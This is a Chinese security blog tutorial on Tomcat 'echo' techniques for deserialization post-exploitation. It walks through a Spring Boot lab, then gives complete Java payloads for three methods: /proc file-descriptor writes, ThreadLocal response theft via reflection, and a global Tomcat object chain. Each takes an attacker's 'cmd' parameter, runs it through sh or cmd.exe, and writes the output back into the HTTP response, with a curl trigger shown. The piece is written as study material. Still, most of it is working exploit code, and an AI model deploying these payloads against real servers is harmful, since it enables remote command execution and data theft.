# Tomcat回显技术学习汇总

阅读量 **177836**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-17 10:00:02

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t015ca7189e022a3bec.jpg)

## 0x01 简介

2022年初打算把反序列化漏洞后利用技术给学习下，主要分为回显技术和内存马技术两大模块。因为之前对回显技术有所了解，就先把这块知识给弥补下。

## 0x02 搭建环境

采用简单的Spring-boot可以快速搭建web项目，并且使用Spring内置的轻量级Tomcat服务，虽然该Tomcat阉割了很多功能，但是基本够用。整个demo放在了github上，地址为<https://github.com/BabyTeam1024/TomcatResponseLearn>

###  0x1 创建项目

选择Spring Initializr

![](https://p3.ssl.qhimg.com/t01dfe09b713a2fb2b8.png)

###  0x2 添加代码

在项目的package中创建controller文件夹，并编写TestController类

    
    
    package com.example.tomcatresponselearn.controller;
    
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.ResponseBody;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    
    @Controller
    @RequestMapping("/app")
    public class TestController {
    
        @RequestMapping("/test")
        @ResponseBody
        public String testDemo(String input, HttpServletResponse response) throws IOException {
            System.out.println(response);
            org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
            javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
            javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
    
            String cmd = httprequest.getHeader("cmd");
            if(cmd != null && !cmd.isEmpty()){
                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                try {
                    httpresponse.getWriter().printf(res);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return "Hello World!";
        }
    }
    

正常在编写Spring-boot代码的时候是不需要在testDemo函数中添加调用参数的。这里为了方便查看Response对象，因此在该函数上添加了HttpServletResponse。

###  0x3 添加Maven地址

在ubuntu上搭建环境的时候遇到了依赖包下载失败的情况。

![](https://p3.ssl.qhimg.com/t0187280823adc55f1b.png)

添加如下仓库地址即可解决问题

    
    
    https://repo.maven.apache.org/maven2
    

## 0x03 各种回显技术

###  0x1 通过文件描述符回显

**1\. 简介**

2020年1月00theway师傅在《通杀漏洞利用回显方法-linux平台》文章中提出了一种回显思路

>
> 经过一段时间的研究发现了一种新的通杀的回显思路。在LINUX环境下，可以通过文件描述符”/proc/self/fd/i”获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。

简单来讲就是利用linux文件描述符实现漏洞回显。作为众多回显思路中的其中一种方法，虽然效果没有后两者的通用型强，但笔者打算学习下这种基于linux文件描述符的特殊利用姿势。

**2\. 可行性分析**

从理论上讲如果获取到了当前请求对应进程的文件描述符，如果输出描述符中写入内容，那么就会在回显中显示，从原理上是可行的，但在这个过程中主要有一个问题需要解决

  * 如何获得本次请求的文件描述符

解决这个问题就要思考在一次连接请求过程中有什么特殊的东西可通过代码识别出来，从而筛选出对应的请求信息。那么这个特殊的标识应该就是，客户端的访问ip地址了。

在/proc/net/tcp6文件中存储了大量的连接请求

![](https://p2.ssl.qhimg.com/t018129f00ec1a9bd59.png)

其中local_address是服务端的地址和连接端口，remote_address是远程机器的地址和端口（客户端也在此记录），因此我们可以通过remote_address字段筛选出需要的inode号。这里的inode号会在/proc/xx/fd/中的socket一一对应

![](https://p4.ssl.qhimg.com/t018beaa8e3b35cc8d0.png)

有了这个对应关系，我们就可以在/proc/xx/fd/目录中筛选出对应inode号的socket，从而获取了文件描述符。整体思路如下

  * 1.通过client ip在/proc/net/tcp6文件中筛选出对应的inode号
  * 2.通过inode号在/proc/$PPID/fd/中筛选出fd号
  * 3.创建FileDescriptor对象
  * 4.执行命令并向FileDescriptor对象输出命令执行结果

**3\. 代码编写**

**（1）获得本次请求的文件描述符**

    
    
    a=`cat /proc/$PPID/net/tcp6|awk '{if($10>0)print}'|grep -i %s|awk '{print $10}'`
    b=`ls -l /proc/$PPID/fd|grep 7200A8C0|awk '{print $9}'`
    echo -n $b
    

运行上述命令执行，并将结果存储在num中

    
    
    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
    java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
    java.io.BufferedReader br = new java.io.BufferedReader(isr);
    StringBuilder stringBuilder = new StringBuilder();
    String line;
    
    while ((line = br.readLine()) != null){
        stringBuilder.append(line);
    }
    
    int num = Integer.valueOf(stringBuilder.toString()).intValue();
    

**（2）执行命令并通过文件描述符输出**

    
    
    cmd = new String[]{"/bin/sh","-c","ls /"};
    in = Runtime.getRuntime().exec(cmd).getInputStream();//执行命令
    isr  = new java.io.InputStreamReader(in);
    br = new java.io.BufferedReader(isr);
    stringBuilder = new StringBuilder();
    
    while ((line = br.readLine()) != null){//读取命令执行结果
        stringBuilder.append(line);
    }
    
    String ret = stringBuilder.toString();
    java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});//获取构造器
    c.setAccessible(true);
    
    java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(num)}));//创建对象
    os.write(ret.getBytes());//向文件描述符中写入结果
    os.close();
    

**4\. 代码整合**

在实际使用过程中注意把客户端IP地址转换成16进制字节倒序，替换xxxx字符串。

    
    
    String[] cmd = { "/bin/sh", "-c", "a=`cat /proc/$PPID/net/tcp6|awk '{if($10>0)print}'|grep -i xxxx|awk '{print $10}'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '{print $9}'`;echo -n $b"};
    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
    java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
    java.io.BufferedReader br = new java.io.BufferedReader(isr);
    StringBuilder stringBuilder = new StringBuilder();
    String line;
    
    while ((line = br.readLine()) != null){
        stringBuilder.append(line);
    }
    int num = Integer.valueOf(stringBuilder.toString()).intValue();
    
    cmd = new String[]{"/bin/sh","-c","ls /"};
    in = Runtime.getRuntime().exec(cmd).getInputStream();
    isr  = new java.io.InputStreamReader(in);
    br = new java.io.BufferedReader(isr);
    stringBuilder = new StringBuilder();
    
    while ((line = br.readLine()) != null){
        stringBuilder.append(line);
    }
    
    String ret = stringBuilder.toString();
    java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
    c.setAccessible(true);
    
    java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(num)}));
    os.write(ret.getBytes());
    os.close();
    

**5\. 局限性分析**

这种方法只适用于linux回显，并且在取文件描述符的过程中有可能会受到其他连接信息的干扰，一般不建议采取此方法进行回显操作，因为有下面两种更好的回显方式。

###  0x2 通过ThreadLocal Response回显

**1\. 简介**

2020年3月kingkk师傅提出一种基于调用栈中获取Response对象的方法，该方法主要是从ApplicationFilterChain中提取相关对象，因此如果对Tomcat中的Filter有部署上的变动的话就不能通过此方法实现命令回显。

仔细研读了kingkk师傅的思路，发现整个过程并不是很复杂，但前提是要先学会如何熟练使用Java
反射技术进行对象操作。寻找Response进行回显的大概思路如下

  * 1.通过翻阅函数调用栈寻找存储Response的类
  * 2.最好是个静态变量，这样不需要获取对应的实例，毕竟获取对象还是挺麻烦的
  * 3.使用ThreadLocal保存的变量，在获取的时候更加方便，不会有什么错误
  * 4.修复原有输出，通过分析源码找到问题所在

**2\. 代码分析**

师傅就是按照这个思路慢慢寻找，直到找到了保存在ApplicationFilterChain对象中的静态变量lastServicedResponse

![](https://p3.ssl.qhimg.com/t0108bde9b4cf126103.png)

在internalDoFilter函数中有对该ThreadLocal变量赋值的操作

![](https://p4.ssl.qhimg.com/t01df108ebf7ae5e172.png)

但是通过分析代码发现，改变量在初始化运行的时候就已经被设置为null了，这就需要通过反射的方式让lastServiceResponse进行初始化。

![](https://p1.ssl.qhimg.com/t014430466194696389.png)

在使用response的getWriter函数时，usingWriter
变量就会被设置为true。如果在一次请求中usingWriter变为了true那么在这次请求之后的结果输出时就会报错

![](https://p1.ssl.qhimg.com/t01ee58f7769e1cbdf6.png)

报错内容如下，getWriter已经被调用过一次

![](https://p5.ssl.qhimg.com/t0104d0321efda9acb5.png)

那么在代码设计的时候也要解决这个问题，才能把原有的内容通过http返回包输出来。

通过分析得到其具体实施步骤为

  * 1.使用反射把ApplicationDispathcer.WRAP_SAME_OBJECT变量修改为true
  * 2.使用反射初始化ApplicationDispathcer中的lastServicedResponse变量为ThreadLocal
  * 3.使用反射从lastServicedResponse变量中获取tomcat Response变量
  * 4.使用反射修复输出报错

**3\. 代码编写**

**（1）ApplicationDispathcer.WRAP_SAME_OBJECT变量修改为true**  
通过上面的需求，编写对应的代码进行实现，需要提前说明的是WRAP_SAME_OBJECT、lastServicedRequest、lastServicedResponse为static
final变量，而且后两者为私有变量，因此需要modifiersField的处理将FINAL属性取消掉。

![](https://p4.ssl.qhimg.com/t01e7266d57fbfd8070.png)

![](https://p5.ssl.qhimg.com/t019a1560485a6a1cd5.png)

相对应的实现代码如下

    
    
    Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");//获取WRAP_SAME_OBJECT字段
    Field modifiersField = Field.class.getDeclaredField("modifiers");//获取modifiers字段
    modifiersField.setAccessible(true);//将变量设置为可访问
    modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
    WRAP_SAME_OBJECT_FIELD.setAccessible(true);//将变量设置为可访问
    WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);//将变量设置为true
    

**（2）初始化ApplicationDispathcer中的lastServicedResponse变量为ThreadLocal**  
这里需要把lastServicedResponse和lastServiceRequest，因为如果这两个其中之一的变量为初始化就会在set的地方报错。

![](https://p1.ssl.qhimg.com/t01ad99477389bc8ba3.png)

相对应的实现代码如下

    
    
    Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");//获取lastServicedRequest变量
    Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");//获取lastServicedResponse变量
    modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
    modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
    lastServicedRequestField.setAccessible(true);//将变量设置为可访问
    lastServicedResponseField.setAccessible(true);//将变量设置为可访问
    lastServicedRequestField.set(null, new ThreadLocal<>());//设置ThreadLocal对象
    lastServicedResponseField.set(null, new ThreadLocal<>());//设置ThreadLocal对象
    

这里仅仅实现了如何初始化lastServicedRequest和lastServicedResponse这两个变量为ThreadLocal。在实际实现过程中需要添加判断，如果lastServicedRequest存储的值不是null那么就不要进行初始化操作。  
 **（3）从lastServicedResponse变量中获取tomcat Response变量**  
从上面代码中的lastServicedResponseField直接获取lastServicedResponse变量，因为这时的lastServicedResponse变量为ThreadLocal变量，可以直接通过get方法获取其中存储的变量。

    
    
    ThreadLocal<ServletResponse> lastServicedResponse =           (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);//获取lastServicedResponse变量
    ServletResponse responseFacade = lastServicedResponse.get();//获取lastServicedResponse中存储的变量
    

**（4）修复输出报错**  
可以在调用getWriter函数之后，通过反射修改usingWriter变量值。

    
    
    Field responseField = ResponseFacade.class.getDeclaredField("response");//获取response字段
    responseField.setAccessible(true);//将变量设置为可访问
    Response response = (Response) responseField.get(responseFacade);//获取变量
    Field usingWriter = Response.class.getDeclaredField("usingWriter");//获取usingWriter字段
    usingWriter.setAccessible(true);//将变量设置为可访问
    usingWriter.set((Object) response, Boolean.FALSE);//设置usingWriter为false
    

果然在添加过这个代码之后就没有任何问题了。

**4\. 代码整合**

搬运kingkk师傅代码供大家参考

    
    
    Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
    Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
    Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
    Field modifiersField = Field.class.getDeclaredField("modifiers");
    modifiersField.setAccessible(true);
    modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
    modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
    modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
    WRAP_SAME_OBJECT_FIELD.setAccessible(true);
    lastServicedRequestField.setAccessible(true);
    lastServicedResponseField.setAccessible(true);
    
    ThreadLocal<ServletResponse> lastServicedResponse =
        (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
    ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
    boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
    String cmd = lastServicedRequest != null
        ? lastServicedRequest.get().getParameter("cmd")
        : null;
    if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
        lastServicedRequestField.set(null, new ThreadLocal<>());
        lastServicedResponseField.set(null, new ThreadLocal<>());
        WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
    } else if (cmd != null) {
        ServletResponse responseFacade = lastServicedResponse.get();
        responseFacade.getWriter();
        java.io.Writer w = responseFacade.getWriter();
        Field responseField = ResponseFacade.class.getDeclaredField("response");
        responseField.setAccessible(true);
        Response response = (Response) responseField.get(responseFacade);
        Field usingWriter = Response.class.getDeclaredField("usingWriter");
        usingWriter.setAccessible(true);
        usingWriter.set((Object) response, Boolean.FALSE);
    
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        w.write(output);
        w.flush();
    }
    

触发方式如下，在网页回显中会把命令执行的结果和之前的内容一并输出来。

    
    
    curl  'http://127.0.0.1:8080/app/test?cmd=id'
    

**5\. 局限性分析**

通过完整的学习这个回显方式，可以很明显的发现这个弊端，如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat
Response进行回显。其中Shiro RememberMe反序列化漏洞就遇到了这种情况，相关代码如下  
 **org.apache.catalina.core.ApplicationFilterChain核心代码**

    
    
    if (pos < n) {
        ApplicationFilterConfig filterConfig = filters[pos++];
        try {
            Filter filter = filterConfig.getFilter();
            ...
             filter.doFilter(request, response, this);//Shiro漏洞触发点
        } catch (...)
            ...
        }
    }
    try {
        if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
            lastServicedRequest.set(request);
            lastServicedResponse.set(response);//Tomcat回显关键点
        }
        if (...){
            ...
        } else {
            servlet.service(request, response);//servlet调用点
        }
    } catch (...) {
        ...
    } finally {
        ...
    }
    

这种方法已经能够满足大多数情况下的回显需求。并且从中学习到了很多回显思想和操作，将它融合在ysoserial中就能实现在tomcat部署的web服务中的反序列化回显。下面介绍一种不依靠FilterChain的通用型更强的Tomcat回显技术。

###  0x3 通过全局存储 Response回显

2020年3月长亭Litch1师傅找到的一种基于全局储存的新思路，寻找在Tomcat处理Filter和Servlet之前有没有存储response变量的对象。整个过程分析下来就像是在构造调用链，一环扣一环，知道找到了那个静态变量或者是那个已经创建过的对象。然而师傅通过后者完成了整个利用，下面学习下具体的分析方法。

###  1\. 代码分析

在调用栈的初始位置存在Http11Processor对象，该类继承了AbstractProcessor，request和response都在这个抽象类中。

![](https://p3.ssl.qhimg.com/t017938090da4325d80.png)

因为不是静态变量因此要向上溯源，争取找到存储Http11Processor或者Http11Processor
request、response的变量。继续翻阅调用栈，在AbstractProtcol内部类ConnectionHandler的register方法中存在着对Http11Processor的操作

![](https://p4.ssl.qhimg.com/t01a32c355171e05f2e.png)

具体代码如下，rp为RequestInfo对象，其中包含了request对象，然而request对象包含了response对象

![](https://p0.ssl.qhimg.com/t01de8c3acb215191f4.png)

所以我们一旦拿到RequestInfo对象就可以获取到对应的response对象

![](https://p5.ssl.qhimg.com/t01b7342324de9af72d.png)

    
    
    RequestInfo->req->response
    

因为在register代码中把RequestInfo注册到了global中

![](https://p1.ssl.qhimg.com/t01e4f53c1195f0d453.png)

因此如果获取到了global解决问题，global变量为AbstractProtocol静态内部类ConnectionHandler的成员变量。因为改变量不是静态变量，因此我们还是需要找存储AbstractProtocol类或AbstractProtocol子类。现在的获取链变为了

    
    
    AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response
    

在调用栈中存在CoyoteAdapter类，其中的connector对象protocolHandler属性为Http11NioProtocol，Http11NioProtocol的handler就是AbstractProtocol$ConnectoinHandler。

    
    
    connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response
    

如何获取connector对象就成为了问题所在，Litch1师傅分析出在Tomcat启动过程中会创建connector对象，并通过addConnector函数存放在connectors中

![](https://p5.ssl.qhimg.com/t0116bf99c0eb239764.png)

那么现在的获取链变成了

    
    
    StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response
    

connectors同样为非静态属性，那么我们就需要获取在tomcat中已经存在的StandardService对象，而不是新创建的对象。

**2\. 关键步骤**

如果能直接获取StandardService对象，那么所有问题都能够迎刃而解。Litch1师傅通过分析Tomcat类加载获取到了想要的答案。

之前我们在《Java安全—JVM类加载》那篇文章中有介绍Tomcat 是如何破坏双亲委派机制的。

>
>
> 首先说明双亲委派机制的缺点是，当加载同个jar包不同版本库的时候，该机制无法自动选择需要版本库的jar包。特别是当Tomcat等web容器承载了多个业务之后，不能有效的加载不同版本库。为了解决这个问题，Tomcat放弃了双亲委派模型。
>
> 当时分析Shiro反序列化的时候，遇到了Tomcat的类加载器重写了loadClass函数，从而没有严格按照双亲委派机制进行类加载，这样才能实现加载多个相同类，相当于提供了一套隔离机制，为每个web容器提供一个单独的WebAppClassLoader加载器。
>
> Tomcat加载机制简单讲，WebAppClassLoader负责加载本身的目录下的class文件，加载不到时再交给CommonClassLoader加载，这和双亲委派刚好相反。
>  

如果在SpringBoot项目中调试看下Thread. _currentThread_ ().getContextClassLoader()中的内容

![](https://p0.ssl.qhimg.com/t017951dfcd575c69f4.png)

WebappClassLoader里面确实包含了很多很多关于tomcat相关的变量，其中service变量就是要找的StandardService对象。那么至此整个调用链就有了入口点

    
    
    WebappClassLoader->resources->context->context->StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response
    

因为这个调用链中一些变量有get方法因此可以通过get函数很方便的执行调用链，对于那些私有保护属性的变量我们只能采用反射的方式动态的获取。

**3\. 代码编写**

**（1）获取Tomcat CloassLoader context**

    
    
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
    

这之后再获取standardContext的context就需要使用反射了  
 **（2）获取standardContext的context**  
因为context不是final变量，因此可以省去一些反射修改操作

![](https://p5.ssl.qhimg.com/t01f912ee9f5cf17b94.png)

具体代码如下

    
    
    Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
    context.setAccessible(true);//将变量设置为可访问
    org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)context.get(standardContext);
    

**（3）获取ApplicationContext的service**

    
    
    Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
    service.setAccessible(true);//将变量设置为可访问
    StandardService standardService = (StandardService)service.get(ApplicationContext);
    

**（4）获取StandardService的connectors**

    
    
    Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
    connectorsField.setAccessible(true);//将变量设置为可访问
    org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[])connectorsField.get(standardService);
    

**（5）获取AbstractProtocol的handler**  
获取到connectors之后，可以通过函数发现getProtocolHandler为public，因此我们可以通直接调用该方法的方式获取到对应的handler。

    
    
    org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();
    Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
    handlerField.setAccessible(true);
    org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);
    

**（6）获取内部类ConnectionHandler的global**  
好多师傅们都是通过getDeclaredClasses的方式获取到AbstractProtocol的内部类。笔者通过org.apache.coyote.AbstractProtocol$ConnectionHandler的命名方式，直接使用反射获取该内部类对应字段。

    
    
    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
    globalField.setAccessible(true);
    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);
    

**（7）获取RequestGroupInfo的processors**  
processors为List数组，其中存放的是RequestInfo

    
    
    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
    processors.setAccessible(true);
    java.util.List<RequestInfo> RequestInfolist = (java.util.List<RequestInfo>) processors.get(global);
    

**（8）获取Response，并做输出处理**  
遍历获取RequestInfolist中的所有requestInfo，使用反射获取每个requestInfo中的req变量，从而获取对应的response。在getWriter后将usingWriter置为false，并调用flush进行输出。

    
    
    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
    req.setAccessible(true);
    for (RequestInfo requestInfo : RequestInfolist) {//遍历
        org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(requestInfo);//获取request
        org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.getNote(1);//获取catalina.connector.Request类型的Request
        org.apache.catalina.connector.Response response2 = request2.getResponse();
        java.io.Writer w = response2.getWriter();//获取Writer
        Field responseField = ResponseFacade.class.getDeclaredField("response");
        responseField.setAccessible(true);
        Field usingWriter = Response.class.getDeclaredField("usingWriter");
        usingWriter.setAccessible(true);
        usingWriter.set(response2, Boolean.FALSE);//初始化
        w.write("1111");
        w.flush();//刷新
    }
    

**4\. 代码整合**

这个流程下来可以大大锻炼Java反射的使用熟练度。如果按照之前分析的调用链一步一步构造，逻辑相对来说还是比较清晰的。完整代码如下

    
    
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webappClassLoaderBase.getResources().getContext();
    
    Field contextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
    contextField.setAccessible(true);
    org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)contextField.get(standardContext);
    
    Field serviceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
    serviceField.setAccessible(true);
    org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService)serviceField.get(ApplicationContext);
    
    Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
    connectorsField.setAccessible(true);
    org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[])connectorsField.get(standardService);
    
    org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();
    Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
    handlerField.setAccessible(true);
    org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);
    
    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
    globalField.setAccessible(true);
    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);
    
    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
    processors.setAccessible(true);
    java.util.List<RequestInfo> RequestInfolist = (java.util.List<RequestInfo>) processors.get(global);
    
    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
    req.setAccessible(true);
    for (RequestInfo requestInfo : RequestInfolist) {
        org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(requestInfo);
        org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.getNote(1);
        org.apache.catalina.connector.Response response2 = request2.getResponse();
        java.io.Writer w = response2.getWriter();
    
        String cmd = request2.getParameter("cmd");
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        w.write(output);
        w.flush();
    
        Field responseField = ResponseFacade.class.getDeclaredField("response");
        responseField.setAccessible(true);
        Field usingWriter = Response.class.getDeclaredField("usingWriter");
        usingWriter.setAccessible(true);
        usingWriter.set(response2, Boolean.FALSE);
    }
    

**5\. 局限性分析**

利用链过长，会导致http包超长，可先修改org.apache.coyote.http11.AbstractHttp11Protocol的maxHeaderSize的大小，这样再次发包的时候就不会有长度限制。还有就是操作复杂可能有性能问题，整体来讲该方法不受各种配置的影响，通用型较强。

## 0x04 总结

主要学习了Tomcat的各种回显技术，重点把如何找Tomcat catalina
Response的过程捋了捋，总的来说通过Tomat类加载器获取Response对象的方法更具有普适性。接下来会继续分析反序列化漏洞后利用的相关技术，内存马驻留技术和查杀技术。

## 参考文章

<https://github.com/feihong-cs/Java-Rce-Echo>  
<https://zhuanlan.zhihu.com/p/114625962>  
[https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&a%20cmid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&a%20cmid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3)  
<https://www.cnblogs.com/nice0e3/p/14891711.html#0x01-tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE>  
<https://github.com/Litch1-v/ysoserial>  
<https://www.00theway.org/2020/01/17/java-god-s-eye/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D4ck** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/264821](/post/id/264821)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Tomcat](/tag/Tomcat)
  * [回显技术](/tag/回显技术)

 **+1** __1赞

 __收藏

![](https://p2.ssl.qhimg.com/t018452be330c01b353.png) D4ck

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

